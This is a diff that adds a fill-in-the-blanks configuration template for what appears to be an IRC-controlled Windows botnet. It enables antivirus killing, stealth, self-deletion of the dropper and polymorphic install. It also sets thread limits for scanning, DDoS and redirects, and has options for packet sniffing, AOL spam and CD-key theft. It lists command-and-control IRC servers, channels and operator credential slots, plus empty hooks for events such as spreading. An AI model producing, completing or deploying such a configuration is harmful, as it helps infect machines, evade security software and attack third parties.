@@ -1,0 +1,61 @@
+cvar	bot_filename	filename.exe
+cvar	bot_id	YOURID1
+cvar	bot_prefix	.
+cvar	bot_timeout	9999999
+cvar	bot_seclogin	false
+cvar	bot_compnick	false
+cvar	bot_randnick	true
+cvar	bot_meltserver	true
+cvar	bot_topiccmd	false
+cvar	do_speedtest	false
+cvar	do_avkill	true
+cvar	do_stealth	true
+cvar	as_valname	filename process
+cvar	as_enabled	true
+cvar	as_service	false
+cvar	as_service_name	filename process
+cvar	scan_maxthreads	10
+cvar	scan_maxsockets	1024
+cvar	ddos_maxthreads	200
+cvar	redir_maxthreads	200
+cvar	identd_enabled	false
+cvar	cdkey_windows	false
+cvar	scaninfo_level	1
+cvar	spam_aol_channel	##A01##
+cvar	spam_aol_enabled	false
+cvar	sniffer_enabled	false
+cvar	sniffer_channel	##SPY##
+cvar	scaninfo_chan	##scan##
+cvar	inst_polymorph	true
+cvar	vuln_channel	##Vuln##
+server	false	(NULL)	(NULL)	irc.ircd.com	6667	chan-key	##CHAN##	false
+server	false	(NULL)	(NULL)	irc2.ircd.com	6667	chan-key	##CHAN##	false
+user	your-user	your-pass	host-name.com	ident
+user	your-user2	your-pass2	host-name2.com	ident2
+script
+onstart {
+}
+
+onconnect {
+}
+
+onjoin {
+}
+
+onlogin {
+}
+
+ondisconnect {
+}
+
+onremove {
+}
+
+onspread {
+}
+
+ondebugeractive {
+}
+
+ontimer 10080m {
+}
